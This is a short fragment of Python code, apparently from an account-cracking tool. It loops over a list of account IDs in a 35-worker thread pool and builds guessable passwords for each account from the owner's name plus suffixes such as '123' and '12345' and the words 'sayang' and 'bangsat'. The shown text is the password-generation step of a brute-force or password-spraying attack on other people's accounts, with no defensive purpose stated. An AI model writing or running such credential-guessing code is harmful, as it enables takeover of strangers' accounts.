			...
			with Bool(max_workers=35) as kirim:
				...
				for email in id:
					...
					if(len(str(name.lower()))>=6):
						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345','sayang','bangsat']
					elif(len(str(name.lower()))<=2):
						pw=[name.lower()+'1234',name.lower()+'12345','sayang','bangsat']
					elif(len(str(name.lower()))<=3):
						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345','sayang','bangsat']
					else:
						pw=[name.lower()+'12345','sayang','bangsat']
